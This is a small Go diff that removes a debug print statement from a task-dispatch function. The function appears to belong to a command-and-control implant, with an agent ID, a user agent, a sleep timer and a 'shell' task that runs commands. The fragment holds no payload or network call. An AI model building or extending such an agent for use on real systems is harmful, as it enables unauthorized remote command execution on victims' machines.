@@ -26,8 +26,6 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 		task = taskSplit[0]
 		taskData := taskSplit[1]
 
-		fmt.Println(task)
-
 		switch task {
 		case "shell":
 			data, _ = hg.PsReturn(taskData)
